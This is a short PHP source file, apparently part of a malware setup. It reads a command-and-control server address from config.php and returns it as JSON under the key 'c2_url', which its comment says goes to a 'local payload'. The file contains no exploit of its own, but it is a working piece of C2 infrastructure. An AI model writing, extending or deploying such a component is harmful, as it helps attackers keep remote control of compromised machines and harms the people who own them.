<?php
// get_config.php - Broadcasts the target URL to the local payload
require_once 'config.php';

header('Content-Type: application/json');
echo json_encode(["c2_url" => $c2_server_url]);
?>